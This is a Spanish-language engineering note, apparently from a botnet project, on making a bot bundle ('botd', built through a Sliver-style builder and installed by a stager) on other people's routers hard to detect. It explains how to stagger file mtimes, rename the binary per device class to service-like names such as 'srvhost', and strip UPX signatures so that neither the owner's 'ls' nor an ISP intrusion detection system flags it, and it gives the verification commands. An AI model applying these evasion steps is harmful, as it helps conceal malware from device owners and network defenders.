# Firma del bundle en dispositivo (T-1305, A1-08)

**Que busca.** El A1-08 dice que cuatro ficheros con el mismo mtime del
overlay y la magia `UPX!` donde nada se empaqueta son la firma del
proveedor de 2009: un `ls -la /data/botd` del dueño (o del IDS del ISP
sobre el bundle) no debe encontrar ni una cosa ni la otra.

**mtimes escalonados.** `scripts/build/stagger_mtime.sh --dir=/data/botd`
escala los mtimes del bundle con paso >= 10 s tras la copia del stager.
Verificacion exigida (criterio 1):

```bash
stat -c %Y /data/botd/* | sort -u | wc -l   # == numero de ficheros
```

El script auto-verifica `files == unique_mtimes` y `min_gap_s >= step`;
`--self-test` corre el ciclo completo sobre un bundle fixture de 4
ficheros. En dispositivo BusyBox: `touch -d @epoch` existe; la variante
`stat -c %Y` es GNU (en BusyBox usar `busybox stat -c %Y` o `date -r`).

**Renombres por clase.** El nombre del artefacto sale de
`deploy/sliver-builder/profiles.yaml` (`rename:`: A=`botd`, B=`flowd`,
C=`srvhost`) y viaja embebido con
`-ldflags "-X main.name=... -X main.classTag=class-<A|B|C>"`;
`botd --build-label` imprime la etiqueta y `grep -a`/`strings` la aserta
en el binario (en B/C empaquetados, primero `upx -d`). `scripts/cross/matrix.sh`
pasa `--name` explicito, asi que la matriz conserva `botd-<arch>` en
`dist/`; el manifest (T-1403) sigue el renaming: `botctl status` ==
manifest.

**UPX: A no, B/C si.** La magia `UPX!` es firma solo donde nada se
empaqueta: en clase A (amd64/arm64, >= 64 MB RAM, overlay >= 16 MB) el
binario viaja crudo — `file /data/botd/botd` debe decir `stripped` sin
`UPX!`, y el presupuesto del perfil subio a 8 MiB para el raw de ~7,3 MB
(EP-13). En clases B/C (ARM/MIPS de 32 MB, flash cara) el `upx -9` sigue
justificado: sin el packer el binario de 7,3 MB no cabe en el overlay de
muchos routers y la descarga del update cuesta la cuota del dueno; alli
la magia se acepta a cambio de ~60 % menos de bytes en reposo. build.sh
lo guarda: un perfil `upx:false` con magia `UPX!` dentro aborta el build.
